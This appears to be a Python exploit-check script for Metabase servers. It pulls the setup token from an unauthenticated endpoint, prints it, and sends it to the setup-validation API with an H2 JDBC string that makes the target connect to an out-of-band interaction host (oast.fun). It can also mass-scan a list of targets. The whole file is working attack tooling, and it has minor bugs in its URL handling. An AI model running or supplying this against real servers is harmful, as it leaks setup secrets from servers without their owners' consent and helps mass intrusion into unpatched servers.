import requests
import json
import argparse 
import urllib3
import colorama

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class MetabaseScanner:

    url: str
    red = colorama.Fore.RED
    green = colorama.Fore.GREEN


    def __init__(self, url: str):
        self.url = url


    def _get_tokenn(self) -> str:
        """
        Getting token Metabase
        """
        url = self.url.rstrip("/") + "/api/session/properties"
        if not url.startswith("http" or "https"):
            url = "http://" + url

        response = requests.get(url, verify=False)

        try:
            token = response.json().get("setup-token", "Token not found")
            print(f"{self.green}[+] Token: {token}")
            return token
        except:
            print("[-] Failed to get token")
            exit(1)

    def _test_vuln(self, token: str) -> bool:
        """
        Test vulnerability
        """
        json_data = {
            "token": token,
            "details": {
                "engine": "h2",
                "details": {
                    "db": "tcp://cjzsz8d2vtc00008b3gggjxh9wcyyyyyb.oast.fun/test;ifexists=false\\;",
                }
            }
        }

        res = requests.post(self.url.rstrip("/") + "/api/setup/validate", json=json_data, verify=False)
        try:
            res_message = res.json().get('message', '')
        except json.decoder.JSONDecodeError:
            res_message = res.text
            return 
        
        if res_message == "Hmm, we couldn't connect to the database. Make sure your Host and Port settings are correct":
            print(f"{self.red}[+] Vulnerable")
            return True
        else:
            print("[-] Not vulnerable")
            return False
        
    def __call__(self):
        token = self._get_tokenn()
        self._test_vuln(token)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Metabase Scanner")
    parser.add_argument("-u", "--url", help="URL Metabase", required=True)
    parser.add_argument("-m", "--mass", help="Mass Token Metabase", required=False)

    args = parser.parse_args()
    if args.mass:
        with open(args.mass, "r") as f:
            for line in f:
                scanner = MetabaseScanner(line)
                scanner()
    else:
        scanner = MetabaseScanner(args.url)
        scanner()







